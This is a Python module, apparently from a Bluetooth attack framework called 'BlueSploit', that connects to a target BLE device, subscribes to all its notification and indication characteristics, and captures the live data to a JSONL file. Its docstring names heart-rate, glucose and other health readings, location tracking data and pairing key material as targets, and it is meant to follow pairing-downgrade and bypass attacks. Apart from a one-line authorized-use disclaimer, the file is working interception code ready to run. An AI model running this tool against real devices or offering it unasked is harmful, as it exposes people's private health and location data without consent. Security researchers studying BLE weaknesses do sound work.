"""
BlueSploit Post-Exploitation: BLE Notification/Indication Interceptor

Subscribes to all notify/indicate characteristics on a BLE device
and captures the live data stream. Useful for intercepting:
  - Heart rate / health sensor streams
  - Location beacons and tracking data
  - Industrial sensor readings
  - Proprietary command/response protocols
  - Encrypted key material during pairing sequences

Captures are timestamped and saved to JSONL (one JSON record per line)
for offline analysis or replay.

Useful after: ble_pairing_downgrade, ble_sc_bypass, unauth_write
"""

import asyncio
import json
import os
import time
from typing import Dict, List, Optional
from core.base import AuxiliaryModule, ModuleInfo, ModuleOption, BTProtocol, Severity
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors
)

try:
    from bleak import BleakClient, BleakScanner
    from bleak.exc import BleakError, BleakDeviceNotFoundError
    BLEAK_AVAILABLE = True
except ImportError:
    BLEAK_AVAILABLE = False

# UUIDs of characteristics that should not be streaming unencrypted
SENSITIVE_NOTIFY_UUIDS: Dict[str, str] = {
    "00002a37-0000-1000-8000-00805f9b34fb": "Heart Rate Measurement",
    "00002a53-0000-1000-8000-00805f9b34fb": "RSC Measurement",
    "00002a55-0000-1000-8000-00805f9b34fb": "SC Control Point",
    "00002a5a-0000-1000-8000-00805f9b34fb": "Aggregate",
    "00002a5e-0000-1000-8000-00805f9b34fb": "Pulse Oximetry",
    "00002a9d-0000-1000-8000-00805f9b34fb": "Weight Measurement",
    "00002a9f-0000-1000-8000-00805f9b34fb": "User Control Point",
    "00002a1c-0000-1000-8000-00805f9b34fb": "Temperature Measurement",
    "00002a18-0000-1000-8000-00805f9b34fb": "Glucose Measurement",
    "00002a52-0000-1000-8000-00805f9b34fb": "Record Access Control",
    "00002a56-0000-1000-8000-00805f9b34fb": "Digital",
}


class Module(AuxiliaryModule):
    """
    BLE Notification/Indication Interceptor

    Subscribes to every notifiable characteristic and logs all
    incoming data with timestamps.
    """

    info = ModuleInfo(
        name="BLE Notification/Indication Interceptor",
        description=(
            "Subscribe to all BLE notify/indicate characteristics "
            "and capture live data streams"
        ),
        author=["v33ru"],
        protocol=BTProtocol.BLE,
        severity=Severity.HIGH,
        cve=None,
        references=[
            "https://www.bluetooth.com/specifications/specs/gatt-specification-supplement/",
            "https://www.usenix.org/conference/usenixsecurity19/presentation/ryan",
        ],
    )

    def _setup_options(self) -> None:
        self.add_option(ModuleOption(
            name="target",
            required=True,
            description="Target BLE device MAC / UUID address",
        ))
        self.add_option(ModuleOption(
            name="duration",
            required=False,
            description="Capture duration in seconds (0 = until Ctrl+C)",
            default=60,
        ))
        self.add_option(ModuleOption(
            name="output_file",
            required=False,
            description="JSONL output file (empty = auto-generated)",
            default=None,
        ))
        self.add_option(ModuleOption(
            name="timeout",
            required=False,
            description="Connection timeout in seconds",
            default=15,
        ))
        self.add_option(ModuleOption(
            name="verbose",
            required=False,
            description="Print every notification (true/false)",
            default="true",
        ))

    def run(self) -> bool:
        if not BLEAK_AVAILABLE:
            print_error("bleak required — pip install bleak")
            return False

        target = self.get_option("target")
        if not target:
            print_error("Target address required")
            return False

        duration = int(self.get_option("duration"))
        conn_timeout = int(self.get_option("timeout"))
        verbose = str(self.get_option("verbose")).lower() == "true"

        output_file = self.get_option("output_file")
        if not output_file:
            ts = time.strftime("%Y%m%d_%H%M%S")
            safe_addr = target.replace(":", "")
            output_file = f"notify_capture_{safe_addr}_{ts}.jsonl"

        C = Colors
        print(f"\n  {C.RED}╔{'═'*58}╗{C.RESET}")
        print(f"  {C.RED}║{C.RESET} {C.BOLD}BLE Notification Interceptor{C.RESET}                             {C.RED}║{C.RESET}")
        print(f"  {C.RED}╚{'═'*58}╝{C.RESET}\n")

        print_info(f"Target      : {target}")
        print_info(f"Duration    : {duration}s (0=indefinite)")
        print_info(f"Output file : {output_file}")
        print_warning("DISCLAIMER: For authorized security testing only!")

        count = asyncio.run(
            self._intercept(target, duration, conn_timeout, output_file, verbose)
        )

        if count is None:
            print_error("Failed to connect")
            return False

        print_success(f"Captured {count} notification(s) → {output_file}")
        self.add_result({
            "target": target,
            "notifications_captured": count,
            "output_file": output_file,
        })
        return count > 0

    async def _intercept(
        self, target: str, duration: int, conn_timeout: int,
        output_file: str, verbose: bool
    ) -> Optional[int]:
        records: List[dict] = []
        subscribed: List[str] = []

        def make_handler(uuid: str, label: str):
            def handler(sender, data: bytearray):
                ts = time.strftime("%Y-%m-%dT%H:%M:%S")
                is_sensitive = uuid.lower() in SENSITIVE_NOTIFY_UUIDS
                record = {
                    "ts": ts,
                    "uuid": uuid,
                    "label": label,
                    "sensitive": is_sensitive,
                    "hex": bytes(data).hex(),
                    "len": len(data),
                }
                records.append(record)
                if verbose:
                    flag = " [SENSITIVE]" if is_sensitive else ""
                    print_info(
                        f"  [{ts}] {uuid[:8]}… {label}{flag}: "
                        f"{bytes(data).hex()[:48]}{'…' if len(data) > 24 else ''}"
                    )
            return handler

        try:
            async with BleakClient(target, timeout=float(conn_timeout)) as client:
                print_success(f"Connected to {target}")

                for svc in client.services:
                    for char in svc.characteristics:
                        props = char.properties
                        if "notify" in props or "indicate" in props:
                            uuid_str = str(char.uuid).lower()
                            label = SENSITIVE_NOTIFY_UUIDS.get(uuid_str, "Unknown")
                            try:
                                await client.start_notify(
                                    char.uuid,
                                    make_handler(uuid_str, label)
                                )
                                subscribed.append(uuid_str)
                                print_success(
                                    f"  Subscribed: {uuid_str[:8]}… {label}"
                                )
                            except BleakError as e:
                                print_warning(f"  Could not subscribe to {uuid_str[:8]}…: {e}")

                if not subscribed:
                    print_warning("No notify/indicate characteristics found")
                    return 0

                print_info(f"\nCapturing from {len(subscribed)} characteristic(s)…")
                print_info(f"Press Ctrl+C to stop early\n")

                try:
                    if duration > 0:
                        await asyncio.sleep(duration)
                    else:
                        while True:
                            await asyncio.sleep(1)
                except asyncio.CancelledError:
                    pass
                except KeyboardInterrupt:
                    print_warning("Interrupted by user")

                for uuid in subscribed:
                    try:
                        await client.stop_notify(uuid)
                    except Exception:
                        pass

        except BleakDeviceNotFoundError:
            print_error(f"Device {target} not found")
            return None
        except BleakError as e:
            print_error(f"BLE error: {e}")
            return None
        except KeyboardInterrupt:
            pass

        # Save JSONL
        if records:
            try:
                with open(output_file, "w") as f:
                    for rec in records:
                        f.write(json.dumps(rec) + "\n")
            except OSError as e:
                print_error(f"Could not write output file: {e}")

        print_info("─" * 55)
        print_info(f"Subscribed to {len(subscribed)} UUID(s), captured {len(records)} notifications")

        sensitive_count = sum(1 for r in records if r["sensitive"])
        if sensitive_count:
            print_warning(f"{sensitive_count} notifications from sensitive UUIDs — review {output_file}")

        return len(records)
